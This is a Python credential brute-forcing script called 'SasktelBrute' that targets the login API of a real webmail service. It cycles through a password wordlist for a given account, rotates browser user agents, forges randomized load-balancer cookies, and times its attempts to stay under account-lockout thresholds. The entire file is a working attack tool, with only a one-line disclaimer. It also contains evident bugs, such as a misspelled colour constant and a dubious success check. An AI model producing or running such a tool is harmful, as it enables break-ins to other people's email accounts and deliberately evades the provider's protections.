import requests
import argparse
import time
import random
import string
from colorama import Fore, init

init(autoreset=True)  # Automatically resets the color of printed text

USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/85.0.4183.121',  
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
]

def current_timestamp():
    return f"{Fore.YELLOW}{time.strftime('[%H:%M:%S]', time.localtime())}{Fore.RESET}"


def parse_arguments():
    parser = argparse.ArgumentParser(
        prog='SasktelBrute',
        description='Bruteforce Sasktel Webmail. To prevent lockouts, this script will pause for 30 seconds every 10 attempts and pauses for 15 minutes each 49th attempt',
        epilog='Use responsibly and ethically. I am not responsible for any misuse of this script!!')

    parser.add_argument('-w', '--wordlist', required=True, help="Password Wordlist")
    parser.add_argument('-u', '--user', type=str, required=True, help="Full username including @sasktel.net")
    args = parser.parse_args()

    with open(args.wordlist, encoding='latin-1') as file:
        passwords = file.read().splitlines()

    user = args.user

    return user, passwords

def generate_random_cookie_part(length=48):
    characters = string.ascii_letters + string.digits + string.punctuation
    cookie_part = ''.join(random.choice(characters) for i in range(length))
    return cookie_part

def attack(user, password, user_agent):
    url = 'https://webmail.sasktel.net/api/bf/login/'
    random_part = generate_random_cookie_part()
    cookie_value = f"BIGipServer~C7~C7_PMAIL.0_IPv4_80_POOL=!YR/{random_part},"
    headers = {
        'Host': 'webmail.sasktel.net',
        'User-Agent': user_agent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-CA,en-US;q=0.7,en;q=0.3;',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://webmail.sasktel.net/',
        'Content-Type': 'application/json',
        'Cookie': cookie_value,
        'ADRUM': 'isAjax:true',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin'
    }

  
    print(f"{Fore.YELLOW}User-Agent:{Fore.RESET} {user_agent}")
    print(f"{Fore.YELLOW}Cookie:{Fore.RESET} {cookie_value}")
 

    data = {
        "SnapInfo": {
            "SnapEmailField": None,
            "SnapPassField": None,
            "SnapUrl": None,
            "SnapOn": "NO",
            "SnapShortEmailOn": None,
            "SnapRemoteAuth": "YES"
        },
        "user": user,
        "password": password
    }


    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        if response.status_code == 400:
            print(f"{Fore.YELLOW}RESPONSE:{Fore.RESET}{Fore.RED} {response.text}")
        elif response.status_code == 200:
            print(f"{Fore.YELLOW}RESPONSE:{Fore.RESET}{Fore.GREEM} {response.text}")
            if "PASSWORD FOUND" in response.text:
                print(f"{current_timestamp()} PASSWORD FOUND: {Fore.BLUE}{password}")
                return True
    except requests.RequestException as e:
        print(f"{current_timestamp()}Error during request: {e}")
        return False

    return False

if __name__ == '__main__':
    user, passwords = parse_arguments()

    print(f"{current_timestamp()} Starting the attack...")

    attempt_count = 1  # starting from 1 for easier modulo arithmetic
    user_agent_index = 0  

    for password in passwords:
        print(f"\n{current_timestamp()} Attempt #{attempt_count} - Trying password: {password}")

        current_user_agent = USER_AGENTS[user_agent_index]
        user_agent_index = (user_agent_index + 1) % len(USER_AGENTS)

        if attack(user, password, current_user_agent):
            break

        time.sleep(2)
        attempt_count += 1  

        if attempt_count % 49 == 0:
            total_wait_time = 15 * 60  # 15 minutes in seconds
            interval = 5 * 60  # 5 minutes in seconds

            print(f"{current_timestamp()} Waiting for 15 minutes...")
    
            for elapsed_time in range(0, total_wait_time, interval):
                time.sleep(interval)
                remaining_minutes = (total_wait_time - elapsed_time) // 60
                print(f"{current_timestamp()} {remaining_minutes} minutes remaining...")

            # Ensure we've waited the full duration
            time.sleep(total_wait_time - elapsed_time - interval)

        elif attempt_count % 10 == 0:
            print(f"{current_timestamp()} Waiting for 30 seconds...")
            time.sleep(30)

    print(f"{current_timestamp()} Attack finished.")
